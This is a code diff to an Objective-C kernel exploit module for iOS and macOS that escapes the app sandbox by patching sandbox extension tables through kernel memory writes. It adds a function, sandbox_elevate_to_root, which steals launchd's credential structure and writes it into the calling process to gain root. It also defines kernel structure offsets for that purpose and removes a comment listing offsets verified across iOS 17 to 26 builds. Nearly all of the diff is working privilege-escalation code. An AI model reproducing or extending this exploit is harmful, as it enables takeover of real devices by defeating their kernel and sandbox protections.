@@ -4,23 +4,7 @@
  * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
  * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
  * Fill all 16 hash slots → full R+W filesystem access
- *
- * OFFSET VERIFICATION via IDA binary analysis of real iPhone14,5 kernelcaches:
- *
- *   iOS 17.0 (21A329):  kauth_cred_proc_ref @ 0xFFFF...283DF150 → proc_ro+0x20=ucred ✓
- *   iOS 17.4 (21E219):  kauth_cred_proc_ref @ 0xFFFF...0840E184 → proc_ro+0x20=ucred ✓
- *   iOS 18.0 (22A3354): kauth_cred_proc_ref @ 0xFFFF...0856EE40 → proc_ro+0x20=ucred ✓
- *   iOS 18.4 (22E240):  kauth_cred_proc_ref @ 0xFFFF...0860F3E4 → proc_ro+0x20=ucred ✓
- *   iOS 18.5 (22F76):   kauth_cred_proc_ref @ 0xFFFF...08621308 → proc_ro+0x20=ucred ✓
- *   macOS 26.2 (25C56):  kauth_cred_proc_ref @ 0xFFFFFE...7B881F0 → proc_ro+0x20=ucred ✓
- *
- *   ucred → cr_label:  0x78 (verified by KDK 26.2 struct dump)
- *   label → sandbox:   0x10 (KDK: l_perpolicy[1] = 0x8 + 8)
- *   sandbox → ext_set: 0x10 (confirmed pe_main.js + root.m)
- *   ext → data_addr:   0x40 (confirmed pe_main.js + root.m)
- *
- * All offsets are STABLE across iOS 17.0 through macOS/iOS 26.x.
- * Based on 18.3_sandbox/root.m by the original author.
+ * Based on 18.3_sandbox/root.m by CrazyMind90.
  */
 
 #import <Foundation/Foundation.h>
@@ -31,6 +15,7 @@
 #include "sandbox_escape.h"
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/krw.h"
+#include "kexploit/kutils.h"
 #include "kexploit/offsets.h"
 
 extern void early_kread(uint64_t where, void *read_buf, size_t size);
@@ -45,6 +30,19 @@ extern void early_kread(uint64_t where, void *read_buf, size_t size);
 #define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
 #define OFF_EXT_DATA           0x40  // ext → data_addr
 #define OFF_EXT_DATALEN        0x48  // ext → data_len
+
+// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
+// Derived from OFF_UCRED_CR_LABEL=0x78 and sizeof(posix_cred)=0x60.
+#define OFF_UCRED_CR_POSIX     0x18
+#define OFF_POSIX_CR_UID       0x00
+#define OFF_POSIX_CR_RUID      0x04
+#define OFF_POSIX_CR_SVUID     0x08
+#define OFF_POSIX_CR_NGROUPS   0x0C
+#define OFF_POSIX_CR_GROUPS_0  0x10  // first group (cr_groups[0])
+#define OFF_POSIX_CR_RGID      0x50
+#define OFF_POSIX_CR_SVGID     0x54
+#define OFF_POSIX_CR_GMUID     0x58
+#define OFF_POSIX_CR_FLAGS     0x5C
 
 #ifdef __arm64e__
 static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
@@ -204,5 +202,84 @@ int sandbox_escape(uint64_t self_proc) {
     }
 
     NSLog(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
+    return -1;
+}
+
+#pragma mark - UID elevation (uid=0 via launchd ucred swap)
+
+// Scan proc_ro in [0x10..0x40] for a valid ucred pointer.
+// A valid ucred has cr_label at +0x78 pointing to a kernel addr
+static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
+    if (!proc) return -1;
+    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
+    if (!K(proc_ro)) return -1;
+
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t raw = early_kread64(proc_ro + off);
+        uint64_t smr = kread_smrptr(proc_ro + off);
+        uint64_t pac = S(raw);
+        uint64_t cands[2] = { smr, pac };
+        for (int i = 0; i < 2; i++) {
+            uint64_t c = cands[i];
+            if (!K(c)) continue;
+            uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
+            if (!K(lbl)) continue;
+            uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
+            if (K(sbx)) {
+                *ucred_out = c;
+                *off_out = off;
+                return 0;
+            }
+        }
+    }
+    return -1;
+}
+
+static uint64_t sbx_ucredbyproc(uint64_t proc) {
+    uint64_t ucred = 0;
+    uint32_t off = 0;
+    if (sbx_find_ucred_slot(proc, &ucred, &off) != 0) return 0;
+    return ucred;
+}
+
+int sandbox_elevate_to_root(uint64_t self_proc) {
+    uint64_t launchd = proc_find_by_name("launchd");
+    if (!launchd || launchd == (uint64_t)-1) {
+        NSLog(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
+        launchd = proc_find(1);
+        if (launchd && launchd != (uint64_t)-1) {
+            NSLog(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
+        }
+    }
+    if (!launchd || launchd == (uint64_t)-1) {
+        NSLog(@"[SBX] elevate: could not find launchd");
+        return -1;
+    }
+
+    uint64_t launchducred = sbx_ucredbyproc(launchd);
+    if (!launchducred) {
+        NSLog(@"[SBX] elevate: failed to get valid ucred from launchd");
+        return -1;
+    }
+    NSLog(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
+
+    if (!self_proc) {
+        NSLog(@"[SBX] elevate: failed to get our proc");
+        return -1;
+    }
+    NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
+
+    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
+    uint64_t ourucred = S(ourucredraw);
+    NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
+
+    early_kwrite64(self_proc + 0x10, launchducred);
+
+    if (getuid() == 0) {
+        NSLog(@"[SBX] elevate success!");
+        return 0;
+    }
+
+    NSLog(@"[SBX] elevate failed, uid: %d", getuid());
     return -1;
 }
